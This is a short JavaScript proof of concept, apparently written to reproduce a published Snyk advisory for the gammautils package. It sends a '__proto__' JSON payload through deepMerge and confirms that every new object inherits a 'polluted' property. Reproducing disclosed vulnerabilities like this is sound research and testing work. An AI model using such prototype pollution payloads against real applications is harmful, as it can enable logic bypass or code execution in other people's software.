//https://snyk.io/vuln/SNYK-JS-GAMMAUTILS-598670

const gammautils = require('gammautils');
const { assert } = require("@firebase/util");
var obj = {}
console.log("Before : " + obj.polluted);
var payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
//gammautils.object.deepSet({}, '__proto__.polluted2', true);
gammautils.object.deepMerge({}, payload);
console.log("After : " +{}.polluted);
assert({}.polluted === "yes");
console.log("payload success!");